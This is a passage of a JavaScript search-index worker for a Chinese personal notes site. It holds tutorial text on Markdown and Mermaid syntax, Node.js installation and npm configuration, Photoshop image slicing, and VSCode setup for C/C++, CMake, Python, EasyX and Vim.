{R_1}&{1}&{2}&{3}\\\\\\\\ {R_2}&{3}&{2}&{1}\\\\\\\\ \\\\end{array}$ \",\"pR1​R2​​x13​y22​z31​​\"]},{\"header\":\"公式推导\",\"slug\":\"公式推导\",\"contents\":[\"$\\\\begin {aligned} 推导内容1 &\\\\Rightarrow 推导内容2 \\\\\\\\ &\\\\Rightarrow 推导内容3 \\\\\\\\ &\\\\Rightarrow 推导内容4 \\\\end {aligned}$ \",\"推导内容1​⇒推导内容2⇒推导内容3⇒推导内容4​& 符号对齐列, \\\\\\\\符号换行, \\\\ 转义作用\",\"$\\\\begin {aligned} 式子1 &= 式子2 \\\\\\\\ &= 式子3 \\\\\\\\ &= 式子4 \\\\end {aligned}$ \",\"式子1​=式子2=式子3=式子4​\"]},{\"header\":\"回归方程符号\",\"slug\":\"回归方程符号\",\"contents\":[\"样式\",\"写法\",\"样式\",\"写法\",\"xˉ\",\"$\\\\bar{x}$\",\"ηˋ​\",\"$\\\\grave{\\\\eta}$\",\"x˙\",\"$\\\\dot{x}$\",\"a˘\",\"$\\\\breve{a}$\",\"α^\",\"$\\\\hat{\\\\alpha}$\",\"αˇ\",\"$\\\\check{\\\\alpha}$\",\"y¨​\",\"$\\\\ddot{y}$\",\"ι~\",\"$\\\\tilde{\\\\iota}$\",\"ηˊ​\",\"$\\\\acute{\\\\eta}$\"]},{\"header\":\"表格\",\"slug\":\"表格\",\"contents\":[\"使用 | [[#转换规则]] 来分隔不同的单元格，使用 - 来分隔表头和其他行：\",\"| 名称 | 价格 | | ---- | ---- | | 炸鸡 | 19 | | 可乐 | 5 | \",\"为了使 Markdown 更清晰，| 和 - 两侧需要至少有一个空格（最左侧和最右侧的 | 外就不需要了）。\",\"名称\",\"价格\",\"炸鸡\",\"19\",\"可乐\",\"5\",\"为了美观，可以使用空格对齐不同行的单元格，并在左右两侧都使用 | 来标记单元格边界，在表头下方的分隔线标记中加入 :，即可标记下方单元格内容的对齐方式：\",\"| 名称 | 价格 | | :------------ | :---: | | 炸鸡 | 19 | | 可乐 | 32 | \",\"名称\",\"价格\",\"炸鸡\",\"19\",\"可乐\",\"32\",\"若想对一段长文本进行换行，可以在 中间 插入一个 ** <br> ** （ 换行标签 )\"]},{\"header\":\"引用\",\"slug\":\"引用\",\"contents\":[\">“大风起兮云飞扬” \",\"“大风起兮云飞扬”\",\">也可以在引用中 >>使用嵌套的引用 \",\"也可以在引用中\",\"使用嵌套的引用\"]},{\"header\":\"列表\",\"slug\":\"列表\",\"contents\":[]},{\"header\":\"无序列表\",\"slug\":\"无序列表\",\"contents\":[\"* 可以使用 `*` 作为标记 + 也可以使用 `+` - 或者 `-` + 使用tab键可以使用多级列表 \",\"可以使用 * 作为标记\",\"也可以使用 +\",\"或者 -\",\"使用 tab 键可以使用多级列表\"]},{\"header\":\"有序列表\",\"slug\":\"有序列表\",\"contents\":[\"1. 有序列表以数字和 `.` 开始； 3. 数字的序列并不会影响生成的列表序列； 4. 但仍然推荐按照自然顺序（1.2.3...）编写。 \",\"有序列表以数字和 . 开始；\",\"数字的序列并不会影响生成的列表序列；\",\"但仍然推荐按照自然顺序（1.2.3...）编写。\",\"可以使用：数字\\\\. 来取消显示为列表（用反斜杠进行转义） \"]},{\"header\":\"代码\",\"slug\":\"代码\",\"contents\":[]},{\"header\":\"代码块\",\"slug\":\"代码块\",\"contents\":[\" ```语言 代码 \",\"```java public static void main(String[] args) { } \"]},{\"header\":\"行内代码\",\"slug\":\"行内代码\",\"contents\":[\"也可以通过 ``，插入行内代码（` 是 `Tab` 键上边、数字 `1` 键左侧的那个按键）： 例如 `Markdown` \",\"Markdown\"]},{\"header\":\"转换规则\",\"slug\":\"转换规则\",\"contents\":[\"代码块中的文本（包括 Markdown 语法）都会显示为原始内容\"]},{\"header\":\"分隔线\",\"slug\":\"分隔线\",\"contents\":[\"可以在一行中使用三个或更多的 *、- 或 _ 来添加分隔线（``）：\",\"*** ------ ___ \"]},{\"header\":\"待办事项\",\"slug\":\"待办事项\",\"contents\":[\"- [ ] \",\"[ ]\",\"[x]\"]},{\"header\":\"空格\",\"slug\":\"空格\",\"contents\":[\"在一些编辑器或者支持 MD 的笔记软件里，无论你打多少个空格，它只会显示单个 空格 的距离\",\"可以使用 HTML 中 空格 的 字符实体 —— ** &nbsp; **\",\"若要添加 多个 空格，就输入多个——** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ** 例如：\",\"这里有&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6个空格分隔 \",\"结果： 这里有 6 个空格分隔\"]},{\"header\":\"链接\",\"slug\":\"链接\",\"contents\":[]},{\"header\":\"超链接\",\"slug\":\"超链接\",\"contents\":[\"格式为 [link text](link)。\",\"[帮助文档](https://support.typora.io/Links/#faq) \",\"帮助文档\"]},{\"header\":\"自动链接\",\"slug\":\"自动链接\",\"contents\":[\"使用 <> 包括的 URL 或邮箱地址会被自动转换为超链接：\",\"<https://www.baidu.com> <123@email.com> \",\"https://www.baidu.com\",\"123@email.com\"]},{\"header\":\"图片\",\"slug\":\"图片\",\"contents\":[\"![自己起的图片名字](图片地址或者图片本地存储的路径) \"]},{\"header\":\"网上的图片\",\"slug\":\"网上的图片\",\"contents\":[\"![炸鸡](https://ss0.bdstatic.com/94oJfD_bAAcT8t7mm9GUKT-xh_/timg?image&quality=100&size=b4000_4000&sec=1580814517&di=2630beac440e5dab0e44c7286a3b2b61&src=http://imgsrc.baidu.com/forum/w=580/sign=12c730c4ff03738dde4a0c2a831ab073/9497794f9258d1091818e6d6d858ccbf6d814d1b.jpg) \",\"炸鸡\"]},{\"header\":\"本地图片\",\"slug\":\"本地图片\",\"contents\":[\"![美食](美食.jpg) 在同一个文件夹里（用相对路径） 或者直接拷贝 \"]},{\"header\":\"画图\",\"slug\":\"画图\",\"contents\":[\"markdown 画图也是轻量级的，功能并不全。\",\"Mermaid 是一个用于画流程图、状态图、时序图、甘特图的库，使用 JS 进行本地渲染，广泛集成于许多 Markdown 编辑器中。Mermaid 作为一个使用 JS 渲染的库，生成的不是一个“图片”，而是一段 HTML 代码。\",\"（不同的编辑器渲染的可能不一样）\"]},{\"header\":\"流程图 (graph)\",\"slug\":\"流程图-graph\",\"contents\":[]},{\"header\":\"概述\",\"slug\":\"概述\",\"contents\":[\"graph 方向描述 图表中的其他语句... \",\"关键字 graph 表示一个流程图的开始，同时需要指定该图的方向。\",\"其中“方向描述”为：\",\"用词\",\"含义\",\"TB\",\"从上到下\",\"BT\",\"从下到上\",\"RL\",\"从右到左\",\"LR\",\"从左到右\",\"T = TOP，B = BOTTOM，L = LEFT，R = RIGHT，D = DOWN\",\"最常用的布局方向是 TB、LR。\",\"graph TB; A-->B B-->C C-->A \",\"graph LR; A-->B B-->C C-->A \"]},{\"header\":\"流程图常用符号及含义\",\"slug\":\"流程图常用符号及含义\",\"contents\":[]},{\"header\":\"节点形状\",\"slug\":\"节点形状\",\"contents\":[\"表述\",\"说明\",\"含义\",\"id[文字]\",\"矩形节点\",\"表示过程，也就是整个流程中的一个环节\",\"id (文字)\",\"圆角矩形节点\",\"表示开始和结束\",\"id ((文字))\",\"圆形节点\",\"表示连接。为避免流程过长或有交叉，可将流程切开。成对\",\"id\",\"菱形节点\",\"表示判断、决策\",\"id>文字]\",\"右向旗帜状节点\",\"单向箭头线段：表示流程进行方向\",\"id 即为节点的唯一标识，A~F 是当前节点名字，类似于变量名，画图时便于引用\",\"括号内是节点中要显示的文字，默认节点的名字和显示的文字都为 A\",\"graph TB A B(圆角矩形节点) C[矩形节点] D((圆形节点)) E{菱形节点} F>右向旗帜状节点] \",\"graph TB begin(出门)--> buy[买东西] buy --> IsRemaining{\\\"没有？\\\"} IsRemaining -->|有|happy[买到了开心]--> goBack(回家) IsRemaining --没有--> sad[\\\"伤心\\\"]--> goBack \"]},{\"header\":\"连线\",\"slug\":\"连线\",\"contents\":[\"graph TB A1-->B1 A2---B2 A3--text---B3 A4--text-->B4 A5-.-B5 A6-.->B6 A7-.text.-B7 A8-.text.->B8 A9===B9 A10==>B10 A11==text===B11 A12==text==>B12 \"]},{\"header\":\"子图表\",\"slug\":\"子图表\",\"contents\":[\"使用以下语法添加子图表\",\"subgraph 子图表名称 子图表中的描述语句... end \",\"graph TB subgraph 买东西前 begin(出门)--> buy[出门买东西] end buy --> IsRemaining{\\\"还有没有？\\\"} IsRemaining --没有--> sad[\\\"伤心\\\"]--> goBack(回家) IsRemaining -->|有|happy[买到啦]--> goBack \"]},{\"header\":\"饼图（Pie）\",\"slug\":\"饼图-pie\",\"contents\":[\"pie title 销售图 \\\"苹果\\\" : 100 \\\"橘子\\\" : 200.4 \\\"香蕉\\\" : 50 \"]},{\"header\":\"甘特图（gantt）\",\"slug\":\"甘特图-gantt\",\"contents\":[\" title 标题 dateFormat 日期格式 section 部分名 任务名:参数一, 参数二, 参数三, 参数四，参数五 //参数一：crit（是否重要，红框框） 或者 不填 //参数二：done（已完成）、active（正在进行） 或者 不填(表示为待完成状态) //参数三：取小名 或者 不填 //参数四：任务开始时间 //参数五：任务结束时间 \",\"官方教程\",\"gantt dateFormat YYYY-MM-DD title Adding GANTT diagram functionality to mermaid section A section Completed task :done, des1, 2014-01-06,2014-01-08 Active task :active, des2, 2014-01-09, 3d Future task : des3, after des2, 5d Future task2 : des4, after des3, 5d section Critical tasks Completed task in the critical line :crit, done, 2014-01-06,24h Implement parser and jison :crit, done, after des1, 2d Create tests for parser :crit, active, 3d Future task in critical line :crit, 5d Create tests for renderer :2d Add to mermaid :1d section Documentation Describe gantt syntax :active, a1, after des1, 3d Add gantt diagram to demo page :after a1 , 20h Add another diagram to demo page :doc1, after a1 , 48h section Last section Describe gantt syntax :after doc1, 3d Add gantt diagram to demo page :20h Add another diagram to demo page :48h \"]}]},\"/software-tool/markdown/\":{\"title\":\"MarkDown\",\"contents\":[]},\"/software-tool/nodejs/01-NodeJS%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE.html\":{\"title\":\"NodeJS下载安装与配置\",\"contents\":[{\"header\":\"什么是 Node JS\",\"slug\":\"什么是-node-js\",\"contents\":[\"Node. js is a JavaScript runtime built on Chrome's V8 JavaScript engine。 Node. js 是一个基于 Chrome V8 引擎的 JavaScript 运行时环境\"]},{\"header\":\"下载\",\"slug\":\"下载\",\"contents\":[\"官网下载：Node.js\",\"NodeJS下载安装与配置01.png\"]},{\"header\":\"安装\",\"slug\":\"安装\",\"contents\":[\"打开安装包，默认 next 下一步即可，等待安装完成。 打开安装目录：\",\"NodeJS下载安装与配置02.png\",\"打开命令提示符，输入如下命令，出现版本号即说明安装成功。\",\"node -v \",\"和\",\"npm -v \",\"NodeJS下载安装与配置03.gif\"]},{\"header\":\"配置\",\"slug\":\"配置\",\"contents\":[\"配置全局安装的模块路径和缓存路径\"]},{\"header\":\"模块路径\",\"slug\":\"模块路径\",\"contents\":[\"在 nodejs 根目录, 创建 node_global，node_cache 文件夹，如图：\",\"NodeJS下载安装与配置04.png\",\"然后以管理员身份打开 cmd，配置路径：\",\"npm config set prefix \\\"D:\\\\nodejs\\\\node_global\\\" \",\"和\",\"npm config set cache \\\"D:\\\\nodejs\\\\node_cache\\\" \",\"NodeJS下载安装与配置05.png\",\"使用如下命令查看：\",\"npm config get prefix \",\"和\",\"npm config get cache \",\"NodeJS下载安装与配置06.png\"]},{\"header\":\"安装 vue\",\"slug\":\"安装-vue\",\"contents\":[\"使用命令：\",\"npm install -g vue \",\"如图：\",\"NodeJS下载安装与配置07.png\"]},{\"header\":\"缓存路径\",\"slug\":\"缓存路径\",\"contents\":[\"找到环境变量：右键此电脑——属性——高级系统设置——高级——环境变量\",\"在用户变量下，将 AppData\\\\Roaming\\\\npm 更改为\",\"D:\\\\nodejs\\\\node_global \",\"NodeJS下载安装与配置08.png\",\"创建 NODE_PATH 变量 变量值为：\",\"D:\\\\nodejs\\\\node_global\\\\node_modules \",\"添加系统变量，在 path 中添加\",\"%NODE_PATH% \",\"步骤如下：\",\"NodeJS下载安装与配置09.gif\",\"最终结果如图： 用户变量，path 中\",\"NodeJS下载安装与配置10.png\",\"系统变量：\",\"NodeJS下载安装与配置11.png\",\"系统变量，path 中：\",\"NodeJS下载安装与配置12.png\"]},{\"header\":\"测试\",\"slug\":\"测试\",\"contents\":[\"打开命令提示符： 输入如下命令：\",\"node \",\"然后输入：\",\"require('vue') \",\"出现如图即测试成功：\",\"NodeJS下载安装与配置13.png\"]},{\"header\":\"配置镜像\",\"slug\":\"配置镜像\",\"contents\":[\"使用国内的镜像可以提高下载速度 命令：\",\"npm config set registry https://registry.npm.taobao.org \",\"查看镜像：\",\"npm config get registry \",\"如图：\",\"NodeJS下载安装与配置14.png\"]}]},\"/software-tool/nodejs/\":{\"title\":\"NodeJS\",\"contents\":[]},\"/software-tool/photoshop/01-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.html\":{\"title\":\"基本操作\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"部分操作：\",\"文件→打开 ：可以打开我们要测量的图片\",\"Ctrl+R：可以打开标尺，或者视图→标尺\",\"右击标尺，把里面的单位改为像素\",\"Ctrl+ 加号 (+)可以放大视图， Ctrl+ 减号 (-)可以缩小视图\",\"按住空格键，鼠标可以变成小手，拖动 PS 视图\",\"用选区拖动可以测量大小\",\"Ctrl+ D 可以取消选区，或者在旁边空白处点击一下也可以取消选区\"]}]},\"/software-tool/photoshop/02-PS%E5%88%87%E5%9B%BE.html\":{\"title\":\"PS切图\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"PS 有很多的切图方式：图层切图、切片切图、PS 插件切图等\"]},{\"header\":\"图层切图\",\"slug\":\"图层切图\",\"contents\":[\"简单版步骤：\",\"使用移动工具，点击需要的图片\",\"查看右侧，找到图片对应的图层，右击图层 → 快速导出为 PNG\",\"但是很多情况下, 我们需要合并图层再导出:\",\"步骤：\",\"选中需要的若干个图层：选择一个图层，再按住 shift 键，继续选第二个图层\",\"然后选择图层菜单 → 合并图层 (ctrl+e)\",\"查看右侧生成的新图层，在合并后的图层上，右击 → 快速导出为 PNG\"]},{\"header\":\"切片切图\",\"slug\":\"切片切图\",\"contents\":[\"步骤：\",\"利用切片选中图片：利用切片工具手动划出\",\"导出选中的图片：文件菜单 → 导出 → 存储为 web 设备所用格式 → 选择我们要的图片格式 → 存储\",\"注意：保存的时候，要选“选中的切片”\"]},{\"header\":\"插件切图\",\"slug\":\"插件切图\",\"contents\":[]},{\"header\":\"介绍\",\"slug\":\"介绍\",\"contents\":[\"Cutterman 是一款运行在 Photoshop 中的插件，能够自动将你需要的图层进行输出，以替代传统的手工 \\\"导出 web 所用格式\\\" 以及使用切片工具进行挨个切图的繁琐流程\",\"它支持各种各样的图片尺寸、格式、形态输出，方便你在 PC、IOS、Android 等端上使用。它不需要你记住一堆的语法、规则，纯点击操作，方便、快捷，易于上手\"]},{\"header\":\"安装\",\"slug\":\"安装\",\"contents\":[\"注意： cutterman 插件要求你的 ps 必须是完整版，不能是绿色版\",\"查看 “窗口菜单”里面的“扩展功能”：\",\"如果是扩展功能的是灰色的，表示就是绿色版的，需要重新安装 PS\",\"如果是扩展功能右侧是可以使用的，表示就是完整版的，可以安装 cutterman 插件快速切图\",\"官网: http://www.cutterman.cn/zh/cutterman\",\"当 cutterman 安装完成后，重启 PS，会发现扩展功能里面多了一个 cutterman 工具\",\"使用步骤：\",\"选择需要的图层\",\"选择 web 端\",\"选择需要的图片格式\",\"设置好存储路径\",\"点击 “导出选中图层” 按钮\"]}]},\"/software-tool/photoshop/\":{\"title\":\"Photoshop\",\"contents\":[]},\"/software-tool/vscode/01-VSCode%E7%BC%96%E5%86%99HTML%E5%92%8CCSS.html\":{\"title\":\"VSCode编写HTML和CSS\",\"contents\":[{\"header\":\"写 HTML/CSS 文件\",\"slug\":\"写-html-css-文件\",\"contents\":[\"新建一个文件，名为 test.html, 输入如下代码：\",\"<html> <body> <h1>这是第一个标题</h1> <p>这是第一个段落</p> </body> </html> \"]},{\"header\":\"运行\",\"slug\":\"运行\",\"contents\":[\"VSCode和HTML和CSS01.png\",\"推荐使用 Live Server 插件，可以实时查看效果。以及 HTML CSS Support 插件，来支持 HTML 和 CSS 语法\"]}]},\"/software-tool/vscode/02-VSCode%E5%BC%80%E5%8F%91%E5%B5%8C%E5%85%A5%E5%BC%8F.html\":{\"title\":\"VSCode开发嵌入式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"使用 Embedded IDE 配合 SDCC 来开发嵌入式 网站中有详细的使用方法\",\"注意：安装时. NET 可能无法自动安装，需自行安装\"]}]},\"/software-tool/vscode/03-VSCode%E9%85%8D%E7%BD%AEC%E5%92%8CCPP%E7%8E%AF%E5%A2%83.html\":{\"title\":\"VSCode配置C和C++环境\",\"contents\":[{\"header\":\"C/C++的编译过程\",\"slug\":\"c-c-的编译过程\",\"contents\":[\"从 .c 或 .cpp 文件通过 编译器 来生成 .exe 文件（可执行程序）\",\"编译器将执行以下步骤\",\"预编译 将 .c 中的头文件展开、宏展开，生成的文件是 .i 文件\",\"编译 将预处理之后的 .i 文件生成 .s 汇编文件\",\"汇编 将 .s 汇编文件生成 .o 目标文件\",\"链接 将 .o 文件链接成目标文件\",\"使用命令行为：\",\"$ cd C++文件目录 $ g++ -c test.cpp $ g++ test.o $ ./a.exe \",\"可以使用 -o 来自定义目标文件的名字\",\"$ cd C++文件目录 $ g++ -c test.cpp -o a.o $ g++ a.o -o test.exe $ ./test.exe \",\"或直接使用\",\"$ cd C++文件目录 $ g++ test.cpp $ ./a.exe \",\"可以使用 -o 来自定义目标文件的名字\"]},{\"header\":\"GCC 编译器下载和配置\",\"slug\":\"gcc-编译器下载和配置\",\"contents\":[\"GCC 中 C 语言编译器是 gcc，c++编译器是 g++，调试器是 gdb\",\"下载 TDM-GCC 联想应用商店下载链接：TDM-GCC-联想应用商店 下载安装即可\"]},{\"header\":\"VSCode 配置 C/C++\",\"slug\":\"vscode-配置-c-c\",\"contents\":[\"下载 C/C++插件\",\"VSCode和C01.png\",\"下载完成后重启 VSCode\",\"配置 新建文件夹（用来放 VSCode 的项目，必须是英文）\",\"在文件夹下创建一个 test1.c 文件 代码如下：\",\"#include <stdio.h> #include <stdlib.h> int main() { printf(\\\"hello world\\\\n\\\"); printf(\\\"你好\\\\n\\\"); system(\\\"pause\\\"); return 0; } \",\"创建一个 test2.cpp 文件 代码如下：\",\"int main() { std::cout << \\\"Hello World 哈哈\\\\n\\\"; system(\\\"pause\\\"); return 0; } \",\"运行,选择 g++编译器，会在文件夹中自动创建 .vscode 文件夹 4. 测试是否成功 5. 设置外部窗口执行 点击右上角齿轮按钮\",\"VSCode和C02.png\",\"点击生成和调试活动文件\",\"VSCode和C03.png\",\"此时 .vscode 文件夹中出现 launch.json 文件 在 launch.json 文件中设置 \\\"externalConsole\\\": false, 将 false 改为 true 6. 中文乱码解决 在 tasks.json 文件中找到 \\\"${fileDirname}\\\\\\\\${fileBasenameNoExtension}.exe\\\", 在其后面添加 , 然后下一行添加 \\\"-fexec-charset=GBK\\\" 即可 9. 设置隐藏. exe 文件 点击设置，搜索：Files: Exclude\",\"VSCode和C04.png\",\"点击添加模式，添加\",\"例如：**/*.exe**/*.class\"]},{\"header\":\"使用命令行进行多文件编译\",\"slug\":\"使用命令行进行多文件编译\",\"contents\":[\"文件目录结构如下\",\"D:. │ main.cpp │ ├─include │ fun.h │ └─src fun.cpp \",\"使用命令\",\"$ g++ .\\\\src\\\\fun.cpp .\\\\main.cpp -o test -I.\\\\include\\\\ \",\"在目录中会生成名称为 test 的可执行文件\"]},{\"header\":\"配置 CMake\",\"slug\":\"配置-cmake\",\"contents\":[]},{\"header\":\"CMake 环境配置\",\"slug\":\"cmake-环境配置\",\"contents\":[\"下载 CMake Download | CMake\",\"安装过程中注意勾选添加系统环境变量\",\"VSCode和C05.png\",\"安装插件 CMake 和 CMake Tools\",\"VSCode和C06.png\",\"安装完成后重启即可\"]},{\"header\":\"CMake 使用\",\"slug\":\"cmake-使用\",\"contents\":[]},{\"header\":\"单文件编译\",\"slug\":\"单文件编译\",\"contents\":[\"在项目文件中创建一个 CMakeLists.txt 文件，注意，名称不能改变，区分大小写\",\"首先进入文件，文件第一行（第一行必须填写）填写本项目对 CMake 最低版本的要求\",\"# 本项目对 CMake 最低版本的要求 cmake_minimum_required(VERSION 版本号) \",\"注：使用 cmake -version 命令可以查看当前设备的版本号\",\"第二行我们编写项目名称\",\"# 项目名称 project(项目名称) \",\"该命令会创建项目本身，并指定项目名称，每个 CMakeLists 文件只能定义一个项目\",\"第三行我们编写生成可执行文件的名称和包含的文件\",\"# 将源文件编译成一个可执行文件 add_executable(可执行文件名称 源文件) \",\"例：\",\"# 将名为 main.cpp 的源文件编译成一个名称为 myProject 的可执行文件 add_executable(myProject main.cpp) \",\"以上三行是必须的\",\"然后使用快捷键 ctrl+shift+p, 运行 CMake config, 等待配置完成即可\",\"然后运行 CMake build\",\"以上是简单的单文件的编译\"]},{\"header\":\"多文件编译\",\"slug\":\"多文件编译\",\"contents\":[\"文件目录结构如下\",\"D:. │ main.cpp │ ├─include │ fun.h │ └─src fun.cpp \",\"在项目文件中创建一个 CMakeLists.txt 文件，注意，名称不能改变，区分大小写\",\"CMakeLists.txt 文件中的内容如下\",\"cmake_minimum_required(VERSION 3.25.1) project(myProject) aux_source_directory(src SRC_SUB) aux_source_directory(. SRC_CUR) add_executable(Project ${SRC_SUB} ${SRC_CUR}) include_directories(include) \",\"cmake_minimum_required (VERSION 版本号) : 本项目对 CMake 最低版本的要求\",\"project() ：设置项目名称，参数可以随意指定\",\"aux_source_directory (dir VAR) : 搜索 dir 目录下所有的源文件，并将结果列表存储在变量 VAR 中\",\"add_executable (target src) : 指定使用源文件 src，生成可执行程序 target , ${变量名} 是取变量的值\",\"include_directories (headDir) : 设置包含的头文件目录\",\"然后使用快捷键 ctrl+shift+p, 运行 CMake config, 等待配置完成即可\",\"然后运行 CMake build\",\"或者使用命令行 在终端中进入 build 目录\",\"$ cd build $ cmake .. $ mingw32-make.exe \",\"最终可执行程序就生成到 build 目录中了\"]}]},\"/software-tool/vscode/04-VSCode%E9%85%8D%E7%BD%AEPython%E7%8E%AF%E5%A2%83.html\":{\"title\":\"VSCode配置Python环境\",\"contents\":[{\"header\":\"下载 Python\",\"slug\":\"下载-python\",\"contents\":[\"打开 Python 官网：https://www.python.org/ ，点击 “Download”下载最新 python 版本\",\"VSCode和Python01.png\",\"下载完成后自动弹出安装界面，务必先把下方两个对勾打上，把想要安装的文件夹路径复制下来，再点击 “Install Now”安装。\",\"等待 Python 安装完成。\"]},{\"header\":\"在 VSCode 中安装 Python 插件\",\"slug\":\"在-vscode-中安装-python-插件\",\"contents\":[\"点击 VSCode 界面左边的 “扩展”，在扩展搜索框中输入 Python，选中第一个框后点击 “安装”\",\"VSCode和Python02.png\"]},{\"header\":\"添加环境变量\",\"slug\":\"添加环境变量\",\"contents\":[\"右键点击 “此电脑”，选择 “属性”，点击 “高级系统设置–环境变量”。在系统变量中找到 “Path”，然后点击 “编辑”\",\"VSCode和Python03.png\",\"进入后，点击 “新建”，把复制的 python. exe 路径粘贴上去，点击 “确定”就完成了 Python 环境的配置\",\"VSCode和Python04.png\"]},{\"header\":\"测试 Python\",\"slug\":\"测试-python\",\"contents\":[\"打开 VSCode，点击“新建文件”，并选择保存为 python 类型\",\"VSCode和Python05.png\",\"输入 print (“hello!”) 并运行\",\"VSCode和Python06.png\",\"如果终端出现 “hello!”，表示 Python 程序测试正常。\",\"这样就配置成功了\"]}]},\"/software-tool/vscode/05-VSCode%E4%BD%BF%E7%94%A8%E5%9B%9E%E8%BD%A6%E9%94%AE%E4%BB%A3%E7%A0%81%E8%A1%A5%E5%85%A8.html\":{\"title\":\"VSCode使用回车键代码补全\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在 （一般都是这个路径）C:\\\\Users\\\\你的用户名\\\\AppData\\\\Roaming\\\\Code\\\\User 下的 keybindings. json 文件中添加一段代码。\",\"{ \\\"key\\\": \\\"enter\\\", \\\"command\\\": \\\"acceptSelectedSuggestion\\\", \\\"when\\\": \\\"editorTextFocus && suggestWidgetVisible\\\" } \",\"然后重启即可\"]}]},\"/software-tool/vscode/06-VSCode%E4%BD%BF%E7%94%A8EasyX%E5%9B%BE%E5%BD%A2%E5%BA%93.html\":{\"title\":\"VSCode使用EasyX图形库\",\"contents\":[{\"header\":\"安装 TDM-GCC\",\"slug\":\"安装-tdm-gcc\",\"contents\":[\"联想应用商店下载链接：TDM-GCC-联想应用商店 官方网站： tdm-gcc 下载安装即可\"]},{\"header\":\"下载 EasyX 图形库\",\"slug\":\"下载-easyx-图形库\",\"contents\":[\"网址: EasyX，下载库文件，解压完之后将 include 文件夹下的头文件和 lib32/lib64 文件夹下的库文件，分别拷贝到 MinGW 的头文件和库文件文件夹中\",\"VSCode和EasyX01.png\",\"(1) 将 include 文件夹下的 easyx. h 和 graphics. h 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\include\\\\ 文件夹里 (2) 将 lib64\\\\libeasyx. a 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\lib\\\\ 文件夹里 (3) 将 lib32\\\\libeasyx. a 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\lib32\\\\ 文件夹里\"]},{\"header\":\"配置 VSCode\",\"slug\":\"配置-vscode\",\"contents\":[\"在 tasks. json 文件中添加链接\",\"{ \\\"tasks\\\": [ { \\\"type\\\": \\\"cppbuild\\\", \\\"label\\\": \\\"C/C++: g++.exe 生成活动文件\\\", \\\"command\\\": \\\"C:\\\\\\\\TDM-GCC-64\\\\\\\\bin\\\\\\\\g++.exe\\\", \\\"args\\\": [ \\\"-fdiagnostics-color=always\\\", \\\"-g\\\", \\\"${file}\\\", \\\"-o\\\", \\\"${fileDirname}\\\\\\\\${fileBasenameNoExtension}.exe\\\", \\\"-fexec-charset=GBK\\\", \\\"-leasyx\\\"//添加此链接 ], \\\"options\\\": { \\\"cwd\\\": \\\"${fileDirname}\\\" }, \\\"problemMatcher\\\": [ \\\"$gcc\\\" ], \\\"group\\\": { \\\"kind\\\": \\\"build\\\", \\\"isDefault\\\": true }, \\\"detail\\\": \\\"调试器生成的任务。\\\" } ], \\\"version\\\": \\\"2.0.0\\\" } \"]},{\"header\":\"测试\",\"slug\":\"测试\",\"contents\":[\"输入如下代码\",\"#include <graphics.h> #include <conio.h> int main() { initgraph(640, 480); circle(320, 240, 100); getch(); closegraph(); return 0; } \",\"运行出现圆圈即成功\"]}]},\"/software-tool/vscode/07-VSCode%E4%BD%BF%E7%94%A8Vim.html\":{\"title\":\"VSCode使用Vim\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"使用 Vim 可以大幅提高编码效率 找到扩展，安装 Vim 扩展即可 添加如下代码到 setting.json 文件中即可设置 jj 键替代 esc 键\",\"{ \\\"vim.insertModeKeyBindings\\\": [ { \\\"before\\\": [\\\"j\\\", \\\"j\\\"], \\\"after\\\": [\\\"<Esc>\\\"] } ], \",\"添加如下代码到 setting.json 文件中即可设置相对行号\",\"\\\"editor.lineNumbers\\\": \\\"relative\\\", \"]}]},\"/software-tool/vscode/\":{\"title\":\"VSCode\",\"contents\":[]}}}");self.onmessage=({data:o})=>{self.postMessage($(o.query,m[o.routeLocale]))};
//# sourceMappingURL=original.js.map
